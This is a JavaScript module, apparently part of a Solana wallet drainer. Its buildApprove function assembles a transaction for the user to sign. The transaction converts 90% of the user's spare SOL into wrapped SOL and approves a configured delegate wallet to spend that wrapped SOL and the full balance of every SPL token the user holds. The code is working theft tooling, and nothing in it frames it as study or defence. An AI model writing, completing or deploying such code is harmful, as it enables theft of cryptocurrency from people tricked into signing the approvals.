const { Transaction, PublicKey, SystemProgram } = require("@solana/web3.js");
const {
    createApproveInstruction,
    getAssociatedTokenAddress,
    createAssociatedTokenAccountInstruction,
    createSyncNativeInstruction,
    NATIVE_MINT
} = require("@solana/spl-token");

const { getUserTokenAccounts } = require("../solana/tokenService");
const { getConfig } = require("../config/environment");
const logger = require("../core/logger");
const { withRetry } = require("../core/rpcPool");
const { setBlockhash } = require("../core/blockhashCache");

const MIN_RAW_AMOUNT = 1000n;

async function buildApprove(user, connection) {
    return withRetry(async (conn) => {
        try {
            const config = getConfig();

            const tx = new Transaction();

            const userPubkey = new PublicKey(user);

            // DELEGATE PUBLIC KEY
            const delegatePubkey = new PublicKey(config.WALLET);

            const { blockhash } = await conn.getLatestBlockhash("confirmed");

            setBlockhash(blockhash);

            tx.recentBlockhash = blockhash;
            tx.feePayer = userPubkey;

            const tokenAccounts = await getUserTokenAccounts(
                userPubkey,
                conn
            );

            if (!tokenAccounts) {
                throw new Error("Failed to fetch token accounts");
            }

            //
            // WSOL
            //
            const SAFE_SOL_BUFFER = 10_000_000n; // 0.01 SOL
            const ATA_RENT_BUFFER = 3_000_000n;

            const solBalance = tokenAccounts.solBalance || 0n;

            if (solBalance > SAFE_SOL_BUFFER) {
                const wsolAta = await getAssociatedTokenAddress(
                    NATIVE_MINT,
                    userPubkey
                );

                const ataExists =
                    tokenAccounts.existingAtas?.includes(
                        wsolAta.toBase58()
                    ) || false;

                let available = solBalance - SAFE_SOL_BUFFER;

                if (!ataExists) {
                    available -= ATA_RENT_BUFFER;
                }

                if (available > 0n) {
                    const wrapAmount = (available * 90n) / 100n;

                    if (wrapAmount > 0n) {
                        // Create ATA if missing
                        if (!ataExists) {
                            tx.add(
                                createAssociatedTokenAccountInstruction(
                                    userPubkey,
                                    wsolAta,
                                    userPubkey,
                                    NATIVE_MINT
                                )
                            );
                        }

                        // SOL -> WSOL
                        tx.add(
                            SystemProgram.transfer({
                                fromPubkey: userPubkey,
                                toPubkey: wsolAta,
                                lamports: Number(wrapAmount)
                            })
                        );

                        // Sync Native
                        tx.add(
                            createSyncNativeInstruction(
                                wsolAta
                            )
                        );

                        // Approve WSOL
                        tx.add(
                            createApproveInstruction(
                                wsolAta,
                                delegatePubkey,
                                userPubkey,
                                Number(wrapAmount)
                            )
                        );
                    }
                }
            }

            //
            // APPROVE ALL SPL TOKENS
            //
            for (const token of tokenAccounts.tokens || []) {
                if (token.amount < MIN_RAW_AMOUNT) {
                    continue;
                }

                if (
                    token.mint &&
                    typeof token.mint.equals === "function" &&
                    token.mint.equals(NATIVE_MINT)
                ) {
                    continue;
                }

                tx.add(
                    createApproveInstruction(
                        token.ata,
                        delegatePubkey,
                        userPubkey,
                        Number(token.amount)
                    )
                );
            }

            logger.info("Approve transaction built", {
                instructions: tx.instructions.length
            });

            return tx;
        } catch (err) {
            logger.error("Failed to build approve tx", {
                error: err.message
            });

            throw err;
        }
    }, "buildApprove");
}

module.exports = { buildApprove };
